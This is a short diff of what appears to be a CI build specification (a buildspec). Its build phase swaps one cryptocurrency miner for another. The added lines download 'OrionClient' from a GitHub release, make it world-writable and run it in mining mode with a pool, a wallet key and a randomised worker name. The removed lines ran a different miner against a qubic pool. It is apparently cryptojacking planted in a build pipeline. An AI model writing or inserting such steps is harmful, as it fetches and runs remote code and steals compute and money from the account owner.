@@ -3,6 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget https://github.com/apool-io/apoolminer/releases/download/v3.1.1/apoolminer_linux_qubic_autoupdate_v3.1.1.tar.gz
-        - tar xf apoolminer_linux_qubic_autoupdate_v3.1.1.tar.gz
-        - chmod 777 apoolminer && ./apoolminer --algo qubic_xmr --account CP_udnvh2owpq --worker pakos --pool qubic1.hk.apool.io:3334
+        - wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient.tar.gz
+        - tar xf OrionClient.tar.gz
+        - cd OrionClient && chmod 777 OrionClient && ./OrionClient mine -a --pool twbitz --key GcwXpYMusMvpbFWx2UHARxnys428PUanXD3E8pBpv3RF --worker $(echo $(shuf -i 1-15000 -n 1)-pkes)
